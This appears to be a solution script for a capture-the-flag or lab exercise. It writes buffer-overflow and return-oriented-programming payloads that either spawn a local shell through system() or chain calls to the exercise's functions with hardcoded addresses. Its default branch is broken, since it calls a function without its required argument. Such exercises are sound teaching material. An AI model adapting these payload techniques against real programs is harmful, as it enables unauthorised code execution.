#!/usr/bin/env python3
import sys
#'/bin/bash\0' : 0xffffd6a5
#1)Overflow buffer
#2)Set string
#2.1)Call function food:
#2.1.1)Push 0xdeadbeef
#2.1.2)Call function
#2.2)Call function feeling_sick:
#2.2.1)Push 0xd15ea5e
#2.2.2)Push 0x0badf00d
#2.2.3)Call function
#3)Call function: lazy

def compose_bof_payload(buffer_len):
	PAYLOAD = b'A'*buffer_len+\
		b'_EBX'+\
		b'_EDI'+\
		b'EBP0'
	return PAYLOAD


def compose_shell_payload():
	buffer_len = 100
	bin_bash_addr = 0xffffd6a5.to_bytes(4,'little')
	system_addr = 0x080491bd.to_bytes(4,'little')
	cmd = b'/usr/bin/sh;echo${IFS}SUCCESS${IFS}'
	PAYLOAD = b'A'*69+\
		cmd+\
		b'_EDI'+\
		b'_EBP'+\
		system_addr+\
		bin_bash_addr
	return PAYLOAD


def compose_echo_payload():
	#Establishing addressed
	buffer_len = 100
	food_addr = 0x080491cb.to_bytes(4,'little')
	magic = 0xdeadbeef.to_bytes(4,'little')
	feeling_sick_addr = 0x0804921b.to_bytes(4,'little')
	magic1 = 0xd15ea5e.to_bytes(4,'little')
	magic2 = 0xbadf00d.to_bytes(4,'little')
	lazy_addr = 0x080491a6.to_bytes(4,'little')
	pop1 = 0x08049022.to_bytes(4,'little')
	#Composing PAYLOAD
	PAYLOAD = compose_bof_payload(buffer_len)+\
		food_addr+\
		pop1+\
		magic+\
		feeling_sick_addr+\
		lazy_addr+\
		magic1+\
		magic2
	return PAYLOAD


def output(PAYLOAD):
	#Outputting PAYLOAD to file
	with open('input_simple_rop.txt','wb') as f:
		f.write(PAYLOAD)
	#Outputting PAYLOAD to stdout
	sys.stdout.buffer.write(PAYLOAD)

def main(mode):
	if mode == 'echo':
		output(compose_echo_payload())
	elif mode == 'shell':
		output(compose_shell_payload())
	else:
		output(compose_bof_payload()+b'_RET')


if __name__ == '__main__':
	if len(sys.argv) < 2:
		exit(-1)
	else:
		main(sys.argv[1])

